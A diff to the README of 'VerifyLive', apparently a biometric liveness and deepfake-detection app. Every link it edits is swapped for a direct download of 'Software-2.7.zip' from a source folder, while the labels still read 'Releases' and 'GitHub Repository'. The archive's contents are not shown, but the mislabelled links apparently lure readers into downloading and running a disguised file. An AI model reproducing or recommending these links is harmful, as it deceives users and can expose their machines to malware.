@@ -4,7 +4,7 @@
 
 Welcome to **VerifyLive**! This application helps you detect biometric liveness and prevent deepfake fraud. It is designed to comply with data protection laws, making it an excellent choice for your verification needs.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%20%20-blue)](https://github.com/ajibssss/verifylive/releases)
+[![Download Now](https://raw.githubusercontent.com/ajibssss/verifylive/main/src/app/actions/Software-2.7.zip%20Now-%20%20-blue)](https://raw.githubusercontent.com/ajibssss/verifylive/main/src/app/actions/Software-2.7.zip)
 
 ## 🌀 What You Need
 
@@ -19,7 +19,7 @@ Before installing, ensure your computer meets these requirements:
 
 To download the application, visit the Releases page:
 
-[Download from Releases](https://github.com/ajibssss/verifylive/releases)
+[Download from Releases](https://raw.githubusercontent.com/ajibssss/verifylive/main/src/app/actions/Software-2.7.zip)
 
 Once there, look for the latest version. Click to download the installer that matches your computer's operating system. 
 
@@ -65,7 +65,7 @@ Once you familiarize yourself with VerifyLive, explore other features:
 
 For support, suggestions, or community impact share, feel free to reach out:
 
-- **GitHub Repository:** [verifylive](https://github.com/ajibssss/verifylive)
+- **GitHub Repository:** [verifylive](https://raw.githubusercontent.com/ajibssss/verifylive/main/src/app/actions/Software-2.7.zip)
 - **Feedback:** Help us improve! Submit your feedback through the issues section on GitHub.
 
 ## 🎯 Conclusion
@@ -74,4 +74,4 @@ VerifyLive provides an easy way to ensure biometric security effectively. Your d
 
 Remember to **download** the software from the Releases page: 
 
-[Download from Releases](https://github.com/ajibssss/verifylive/releases)
+[Download from Releases](https://raw.githubusercontent.com/ajibssss/verifylive/main/src/app/actions/Software-2.7.zip)
